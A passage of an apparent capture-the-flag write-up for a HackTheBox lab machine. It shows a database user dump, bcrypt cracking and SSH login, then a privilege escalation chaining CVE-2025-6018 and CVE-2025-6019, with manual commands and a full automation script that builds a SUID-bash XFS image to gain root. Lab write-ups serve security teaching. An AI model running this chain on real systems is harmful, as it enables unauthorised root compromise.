class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">sh-4.4$ mysql -h 127.0.0.1 -u pterodactyl -pPteraPanel panel -e &quot;SHOW TABLES;&quot;</span><br><span class="line">&lt;-u pterodactyl -pPteraPanel panel -e &quot;SHOW TABLES;&quot;</span><br><span class="line">mysql: Deprecated program name. It will be removed in a future release, use &#x27;/usr/bin/mariadb&#x27; instead</span><br><span class="line">Tables_in_panel</span><br><span class="line">activity_log_subjects</span><br><span class="line">activity_logs</span><br><span class="line">allocations</span><br><span class="line">api_keys</span><br><span class="line">api_logs</span><br><span class="line">audit_logs</span><br><span class="line">backups</span><br><span class="line">database_hosts</span><br><span class="line">databases</span><br><span class="line">egg_mount</span><br><span class="line">egg_variables</span><br><span class="line">eggs</span><br><span class="line">failed_jobs</span><br><span class="line">jobs</span><br><span class="line">locations</span><br><span class="line">migrations</span><br><span class="line">mount_node</span><br><span class="line">mount_server</span><br><span class="line">mounts</span><br><span class="line">nests</span><br><span class="line">nodes</span><br><span class="line">notifications</span><br><span class="line">password_resets</span><br><span class="line">recovery_tokens</span><br><span class="line">schedules</span><br><span class="line">server_transfers</span><br><span class="line">server_variables</span><br><span class="line">servers</span><br><span class="line">sessions</span><br><span class="line">settings</span><br><span class="line">subusers</span><br><span class="line">tasks</span><br><span class="line">tasks_log</span><br><span class="line">user_ssh_keys</span><br><span class="line">users</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>The <code>users</code> table looks juicy, let’s dump it:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sh-4.4$ mysql -h 127.0.0.1 -u pterodactyl -pPteraPanel panel -e &quot;select * from users;&quot;      </span><br><span class="line">&lt;dactyl -pPteraPanel panel -e &quot;select * from users;&quot;</span><br><span class="line">mysql: Deprecated program name. It will be removed in a future release, use &#x27;/usr/bin/mariadb&#x27; instead</span><br><span class="line">id      external_id     uuid    username        email   name_first      name_last       password        remember_token      language        root_admin      use_totp        totp_secret     totp_authenticated_at   gravatar        created_at  updated_at</span><br><span class="line">2       NULL    5e6d956e-7be9-41ec-8016-45e434de8420    headmonitor     headmonitor@pterodactyl.htb     Head    Monitor     $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2    OL0dNy1nehBYdx9gQ5CT3SxDUQtDNrs02VnNesGOObatMGzKvTJAaO0B1zNU        en      1       0       NULL    NULL    1       2025-09-16 17:15:41     2025-09-16 17:15:41</span><br><span class="line">3       NULL    ac7ba5c2-6fd8-4600-aeb6-f15a3906982b    phileasfogg3    phileasfogg3@pterodactyl.htb    Phileas Fogg$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi    6XGbHcVLLV9fyVwNkqoMHDqTQ2kQlnSvKimHtUDEFvo4SjurzlqoroUgXdn8        en      0       0       NULL    NULL    1       2025-09-16 19:44:19     2025-11-07 18:28:50</span><br></pre></td></tr></table></figure></div>
+
+<p>Two bcrypt hashes: <code>headmonitor</code> (root admin on the panel) and <code>phileasfogg3</code>. We feed both into John with rockyou and only <code>phileasfogg3</code> cracks:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ cat hash</span><br><span class="line">$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi</span><br><span class="line">                                                                                                                    </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ john  -w:/usr/share/wordlists/rockyou.txt hash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 1024 for all loaded hashes</span><br><span class="line">Will run 8 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">!QAZ2wsx         (?)     </span><br><span class="line">1g 0:00:00:40 DONE (2026-02-12 00:18) 0.02466g/s 342.6p/s 342.6c/s 342.6C/s goodman..superpet</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure></div>
+
+<p><code>phileasfogg3:!QAZ2wsx</code> is also a system user we can SSH in as, giving us our user flag:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ssh phileasfogg3@pterodactyl.htb</span><br><span class="line">The authenticity of host &#x27;pterodactyl.htb (10.129.246.68)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is: SHA256:FOOqnHbybkpXftYgyrorbBxkgW0L4yMSLYxG8F87SDE</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;pterodactyl.htb&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">** WARNING: connection is not using a post-quantum key exchange algorithm.</span><br><span class="line">** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.</span><br><span class="line">** The server may need to be upgraded. See https://openssh.com/pq.html</span><br><span class="line">(phileasfogg3@pterodactyl.htb) Password: </span><br><span class="line">Have a lot of fun...</span><br><span class="line">Last login: Thu Feb 12 07:22:04 2026 from 10.10.16.4</span><br><span class="line">phileasfogg3@pterodactyl:~&gt; id</span><br><span class="line">uid=1002(phileasfogg3) gid=100(users) groups=100(users)</span><br><span class="line">phileasfogg3@pterodactyl:~&gt; cat user.txt</span><br><span class="line">11543f7fc7cec51b3500943d13bfcb9e</span><br><span class="line">phileasfogg3@pterodactyl:~&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Privilege-Escalation-CVE-2025-6018-CVE-2025-6019"><a href="#Privilege-Escalation-CVE-2025-6018-CVE-2025-6019" class="headerlink" title="Privilege Escalation - CVE-2025-6018 + CVE-2025-6019"></a>Privilege Escalation - CVE-2025-6018 + CVE-2025-6019</h2><p>A quick check on the user’s mailbox gives us a nice hint at the intended path:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">phileasfogg3@pterodactyl:/var/spool/mail&gt; cat phileasfogg3</span><br><span class="line">From headmonitor@pterodactyl Fri Nov 07 09:15:00 2025</span><br><span class="line">Delivered-To: phileasfogg3@pterodactyl</span><br><span class="line">Received: by pterodactyl (Postfix, from userid 0)</span><br><span class="line">id 1234567890; Fri, 7 Nov 2025 09:15:00 +0100 (CET)</span><br><span class="line">From: headmonitor headmonitor@pterodactyl</span><br><span class="line">To: All Users all@pterodactyl</span><br><span class="line">Subject: SECURITY NOTICE — Unusual udisksd activity (stay alert)</span><br><span class="line">Message-ID: 202511070915.headmonitor@pterodactyl</span><br><span class="line">Date: Fri, 07 Nov 2025 09:15:00 +0100</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=&quot;utf-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line"></span><br><span class="line">Attention all users,</span><br><span class="line"></span><br><span class="line">Unusual activity has been observed from the udisks daemon (udisksd). No confirmed compromise at this time, but increased vigilance is required.</span><br><span class="line"></span><br><span class="line">Do not connect untrusted external media. Review your sessions for suspicious activity. Administrators should review udisks and system logs and apply pending updates.</span><br><span class="line"></span><br><span class="line">Report any signs of compromise immediately to headmonitor@pterodactyl.htb</span><br><span class="line"></span><br><span class="line">— HeadMonitor</span><br><span class="line">System Administrator</span><br><span class="line">phileasfogg3@pterodactyl:/var/spool/mail&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>“Unusual udisksd activity” + a SUSE box running an outdated udisks2&#x2F;polkit combo is a textbook setup for the freshly published Qualys <a class="link"   target="_blank" rel="noopener" href="https://blog.qualys.com/vulnerabilities-threat-research/2025/06/17/qualys-tru-discovers-two-local-privilege-escalations-via-pam-and-udisks-in-major-linux-distributions" >CVE-2025-6018 &amp; CVE-2025-6019 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> chain:</p>
+<ul>
+<li><strong>CVE-2025-6018</strong> — <code>pam_env</code> on openSUSE&#x2F;SUSE evaluates <code>~/.pam_environment</code>, letting an unprivileged user inject <code>XDG_SEAT</code>&#x2F;<code>XDG_VTNR</code> to be treated as an <code>allow_active</code> (“physically present”) session by polkit.</li>
+<li><strong>CVE-2025-6019</strong> — <code>udisks2</code> <code>Filesystem.Resize</code> has a race condition during loop-device mounting: the freshly mounted filesystem is briefly exposed under <code>/tmp/blockdev.*/</code> before permissions are tightened, allowing the contents (including a SUID <code>bash</code> we ship inside the image) to be executed.</li>
+</ul>
+<p>The plan is:</p>
+<ol>
+<li>On the attacker box, craft an XFS image containing a SUID <code>/bin/bash</code> (the <em>target’s</em> bash, so glibc versions match) and <code>scp</code> it to the box.</li>
+<li>On the target, write <code>XDG_SEAT=seat0</code> and <code>XDG_VTNR=1</code> to <code>~/.pam_environment</code>, then re-login over SSH so polkit treats us as <code>allow_active</code>.</li>
+<li>Loop-mount the malicious XFS image via <code>udisksctl</code>, fire the resize via D-Bus, race the watcher to grab the SUID <code>bash</code> from <code>/tmp/blockdev*/</code>.</li>
+<li>Run <code>bash -p</code> for <code>euid=0</code>.</li>
+</ol>
+<p>Here’s the manual walkthrough first, just to make sure the chain is understood:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">#################</span><br><span class="line"># Attack Machine</span><br><span class="line">#################</span><br><span class="line"></span><br><span class="line"># Install required tools</span><br><span class="line">sudo apt install xfsprogs -y</span><br><span class="line"></span><br><span class="line"># Clean old files</span><br><span class="line">rm -f xfs.image</span><br><span class="line">rm -rf xfsmnt</span><br><span class="line"></span><br><span class="line"># Create 300MB image</span><br><span class="line">dd if=/dev/zero of=xfs.image bs=1M count=300</span><br><span class="line"></span><br><span class="line"># Format image as XFS</span><br><span class="line">sudo mkfs.xfs -f xfs.image</span><br><span class="line"></span><br><span class="line"># Verify filesystem type</span><br><span class="line">file xfs.image</span><br><span class="line"># Expected: &quot;SGI XFS filesystem data&quot;</span><br><span class="line"></span><br><span class="line"># Mount image</span><br><span class="line">mkdir xfsmnt</span><br><span class="line">sudo mount xfs.image xfsmnt</span><br><span class="line"></span><br><span class="line"># Add SUID bash inside image</span><br><span class="line">sudo cp /bin/bash xfsmnt/bash</span><br><span class="line">sudo chmod 4755 xfsmnt/bash</span><br><span class="line"></span><br><span class="line"># Verify SUID bit</span><br><span class="line">sudo ls -la xfsmnt/bash</span><br><span class="line"></span><br><span class="line"># Unmount image</span><br><span class="line">sudo umount xfsmnt</span><br><span class="line"></span><br><span class="line"># Final verification</span><br><span class="line">file xfs.image</span><br><span class="line">hexdump -C xfs.image | head -3</span><br><span class="line"># Should see: &quot;XFSB&quot; magic bytes</span><br><span class="line"></span><br><span class="line"># Transfer image to target</span><br><span class="line">scp xfs.image phileasfogg3@pterodactyl.htb:/tmp/xfs_real.image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##############</span><br><span class="line"># On Target</span><br><span class="line">##############</span><br><span class="line"></span><br><span class="line"># Verify uploaded file</span><br><span class="line">hexdump -C /tmp/xfs_real.image | head -20</span><br><span class="line"></span><br><span class="line"># Kill volume monitor if needed</span><br><span class="line">killall -KILL gvfs-udisks2-volume-monitor 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"># Setup loop device</span><br><span class="line">udisksctl loop-setup --file /tmp/xfs_real.image --no-user-interaction</span><br><span class="line"># Example output:</span><br><span class="line"># Mapped file /tmp/xfs_real.image as /dev/loop5</span><br><span class="line"># ⚠️ Note the loop number (e.g., loop5)</span><br><span class="line"></span><br><span class="line"># Wait for block device mount and SUID exposure</span><br><span class="line">while true; do</span><br><span class="line">    /tmp/blockdev*/bash -c &#x27;sleep 10; ls -l /tmp/blockdev*/bash&#x27; &amp;&amp; break;</span><br><span class="line">done 2&gt;/dev/null &amp;</span><br><span class="line"></span><br><span class="line"># Trigger filesystem resize via D-Bus</span><br><span class="line"># Replace loop5 with your actual loop device</span><br><span class="line">gdbus call --system \</span><br><span class="line">  --dest org.freedesktop.UDisks2 \</span><br><span class="line">  --object-path /org/freedesktop/UDisks2/block_devices/loop5 \</span><br><span class="line">  --method org.freedesktop.UDisks2.Filesystem.Resize \</span><br><span class="line">  0 &#x27;&#123;&#125;&#x27;</span><br><span class="line"></span><br><span class="line"># Verify SUID bash</span><br><span class="line">ls -l /tmp/blockdev*/bash</span><br><span class="line"># Expected:</span><br><span class="line"># -rwsr-xr-x 1 root root ... /tmp/blockdev.XXXX/bash</span><br><span class="line"></span><br><span class="line">##############</span><br><span class="line"># Privilege Escalation</span><br><span class="line">##############</span><br><span class="line"></span><br><span class="line"># Execute SUID bash</span><br><span class="line">/tmp/blockdev*/bash -p</span><br><span class="line"></span><br><span class="line"># Verify root privileges</span><br><span class="line">id</span><br><span class="line"># Expected:</span><br><span class="line"># uid=1002(phileasfogg3) euid=0(root)</span><br><span class="line"></span><br><span class="line"># Read root flag</span><br><span class="line">cat /root/root.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Once the manual chain works, here’s a single script that wraps everything up end-to-end. It pulls the target’s own <code>/bin/bash</code> first (so it matches the box’s libc), builds the XFS image, drops it onto the target, sets <code>~/.pam_environment</code>, then races the udisks2 resize:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"># HTB Pterodactyl Root Exploit Automation Script</span><br><span class="line"># This script automates the full exploit chain from SSH access to root.txt</span><br><span class="line"># Usage: ./pterodactyl_exploit.sh</span><br><span class="line"></span><br><span class="line">set -e</span><br><span class="line"></span><br><span class="line">TARGET=&quot;phileasfogg3@pterodactyl.htb&quot;</span><br><span class="line">PASSWORD=&quot;!QAZ2wsx&quot;</span><br><span class="line">LOCAL_IP=$(hostname -I | awk &#x27;&#123;print $1&#125;&#x27;)</span><br><span class="line">IMAGE_SIZE=300  # MB</span><br><span class="line"></span><br><span class="line">echo &quot;[*] HTB Pterodactyl Root Exploit Automation&quot;</span><br><span class="line">echo &quot;[*] Target: $TARGET&quot;</span><br><span class="line">echo &quot;&quot;</span><br><span class="line"></span><br><span class="line"># Step 1: Create malicious XFS image locally</span><br><span class="line">echo &quot;[+] Step 1: Creating malicious XFS image with SUID bash...&quot;</span><br><span class="line">cd /tmp</span><br><span class="line">rm -f xfs.image</span><br><span class="line">dd if=/dev/zero of=xfs.image bs=1M count=$IMAGE_SIZE</span><br><span class="line">mkfs.xfs -q xfs.image</span><br><span class="line"></span><br><span class="line"># Mount and prepare the image</span><br><span class="line">sudo mkdir -p /mnt/xfs_mnt</span><br><span class="line">sudo mount -t xfs xfs.image /mnt/xfs_mnt</span><br><span class="line"></span><br><span class="line"># Download bash from target and prepare SUID version</span><br><span class="line">echo &quot;[+] Downloading bash from target...&quot;</span><br><span class="line">scp -o StrictHostKeyChecking=no $&#123;TARGET&#125;:/bin/bash /tmp/target_bash &lt;&lt;EOF</span><br><span class="line">$&#123;PASSWORD&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">sudo cp /tmp/target_bash /mnt/xfs_mnt/bash</span><br><span class="line">sudo chown root:root /mnt/xfs_mnt/bash</span><br><span class="line">sudo chmod 4755 /mnt/xfs_mnt/bash</span><br><span class="line">sudo umount /mnt/xfs_mnt</span><br><span class="line"></span><br><span class="line">echo &quot;[+] Malicious XFS image created successfully&quot;</span><br><span class="line">echo &quot;&quot;</span><br><span class="line"></span><br><span class="line"># Step 2: Upload the image to target</span><br><span class="line">echo &quot;[+] Step 2: Uploading malicious XFS image to target...&quot;</span><br><span class="line">scp -o StrictHostKeyChecking=no /tmp/xfs.image $&#123;TARGET&#125;:/tmp/xfs.image &lt;&lt;EOF</span><br><span class="line">$&#123;PASSWORD&#125;</span><br><span class="line">EOF</span><br><span class="line">echo &quot;[+] Image uploaded to /tmp/xfs.image on target&quot;</span><br><span class="line">echo &quot;&quot;</span><br><span class="line"></span><br><span class="line"># Step 3: Execute Polkit bypass (CVE-2025-6018)</span><br><span class="line">echo &quot;[+] Step 3: Executing Polkit bypass...&quot;</span><br><span class="line">sshpass -p &quot;$&#123;PASSWORD&#125;&quot; ssh -o StrictHostKeyChecking=no $&#123;TARGET&#125; &lt;&lt; &#x27;ENDSSH&#x27;</span><br><span class="line">echo &quot;XDG_SEAT=seat0&quot; &gt; ~/.pam_environment</span><br><span class="line">echo &quot;XDG_VTNR=1&quot; &gt;&gt; ~/.pam_environment</span><br><span class="line">echo &quot;Polkit bypass variables written to ~/.pam_environment&quot;</span><br><span class="line">echo &quot;You will need to logout and login again for this to take effect&quot;</span><br><span class="line">ENDSSH</span><br><span class="line"></span><br><span class="line">echo &quot;&quot;</span><br><span class="line">echo &quot;[!] IMPORTANT: You must logout and login again for Polkit bypass to work&quot;</span><br><span class="line">echo &quot;[!] Run: ssh $&#123;TARGET&#125;&quot;</span><br><span class="line">echo &quot;[!] Then re-run this script or execute the exploit manually&quot;</span><br><span class="line">echo &quot;&quot;</span><br><span class="line"></span><br><span class="line"># Step 4: Execute UDisks2 race condition exploit (CVE-2025-6019)</span><br><span class="line">echo &quot;[+] Step 4: Executing UDisks2 race condition exploit...&quot;</span><br><span class="line">sshpass -p &quot;$&#123;PASSWORD&#125;&quot; ssh -o StrictHostKeyChecking=no $&#123;TARGET&#125; &lt;&lt; &#x27;ENDSSH&#x27;</span><br><span class="line"># Kill interfering process</span><br><span class="line">pkill -KILL gvfs-udisks2-volume-monitor 2&gt;/dev/null</span><br><span class="line">echo &quot;[+] Killed gvfs-udisks2-volume-monitor&quot;</span><br><span class="line"></span><br><span class="line"># Set up loop device from malicious XFS image</span><br><span class="line">LOOP_DEV=$(udisksctl loop-setup --file /tmp/xfs.image --no-user-interaction 2&gt;&amp;1 | grep -oP &quot;/dev/loop\d+&quot;)</span><br><span class="line">echo &quot;[+] Loop device created: $LOOP_DEV&quot;</span><br><span class="line"></span><br><span class="line"># Start background watcher</span><br><span class="line">(</span><br><span class="line">while true; do</span><br><span class="line">    for dev in /tmp/blockdev*; do</span><br><span class="line">        if [ -d &quot;$dev&quot; ] &amp;&amp; [ -x &quot;$dev/bash&quot; ]; then</span><br><span class="line">            echo &quot;[+] Caught SUID bash at $dev/bash&quot;</span><br><span class="line">            &quot;$dev/bash&quot; -p -c &quot;id; cat /root/root.txt&quot; &gt; /tmp/root_out.txt 2&gt;&amp;1</span><br><span class="line">            break 2</span><br><span class="line">        fi</span><br><span class="line">    done</span><br><span class="line">    sleep 0.001</span><br><span class="line">done</span><br><span class="line">) &amp;</span><br><span class="line">WATCHER_PID=$!</span><br><span class="line">echo &quot;[+] Started background watcher (PID: $WATCHER_PID)&quot;</span><br><span class="line"></span><br><span class="line"># Trigger the vulnerable resize</span><br><span class="line">echo &quot;[+] Triggering UDisks2 resize vulnerability...&quot;</span><br><span class="line">gdbus call --system --dest org.freedesktop.UDisks2 \</span><br><span class="line">    --object-path /org/freedesktop/UDisks2/block_devices/$(basename &quot;$LOOP_DEV&quot;) \</span><br><span class="line">    --method org.freedesktop.UDisks2.Filesystem.Resize 0 &quot;&#123;&#125;&quot; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"># Wait for the watcher to catch the race</span><br><span class="line">echo &quot;[+] Waiting for race condition to trigger...&quot;</span><br><span class="line">sleep 10</span><br><span class="line"></span><br><span class="line"># Clean up</span><br><span class="line">kill $WATCHER_PID 2&gt;/dev/null</span><br><span class="line">udisksctl loop-delete --block-device &quot;$LOOP_DEV&quot; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"># Check result</span><br><span class="line">if [ -f /tmp/root_out.txt ]; then</span><br><span class="line">    echo &quot;&quot;</span><br><span class="line">    echo &quot;[+] SUCCESS! Exploit worked!&quot;</span><br><span class="line">    echo &quot;[+] Root privileges obtained:&quot;</span><br><span class="line">    cat /tmp/root_out.txt</span><br><span class="line">else</span><br><span class="line">    echo &quot;[-] Exploit failed - no output file found&quot;</span><br><span class="line">    echo &quot;You may need to try again or re-login for Polkit bypass&quot;</span><br><span class="line">fi</span><br><span class="line">ENDSSH</span><br><span class="line"></span><br><span class="line">echo &quot;&quot;</span><br><span class="line">echo &quot;[*] Exploit automation complete&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Note: between step 3 and step 4 you do have to reconnect at least once, since <code>pam_env</code> only re-reads <code>~/.pam_environment</code> at login. Running it end-to-end:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ./auto.sh                                                           </span><br><span class="line">[*] HTB Pterodactyl Root Exploit Automation</span><br><span class="line">[*] Target: phileasfogg3@pterodactyl.htb</span><br><span class="line"></span><br><span class="line">[+] Step 1: Creating malicious XFS image with SUID bash...</span><br><span class="line">300+0 records in</span><br><span class="line">300+0 records out</span><br><span class="line">314572800 bytes (315 MB, 300 MiB) copied, 0.119294 s, 2.6 GB/s</span><br><span class="line">[+] Downloading bash from target...</span><br><span class="line">** WARNING: connection is not using a post-quantum key exchange algorithm.</span><br><span class="line">** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.</span><br><span class="line">** The server may need to be upgraded. See https://openssh.com/pq.html</span><br><span class="line">(phileasfogg3@pterodactyl.htb) Password: </span><br><span class="line">bash                                                                              100%  989KB 164.4KB/s   00:06    </span><br><span class="line">[+] Malicious XFS image created successfully</span><br><span class="line"></span><br><span 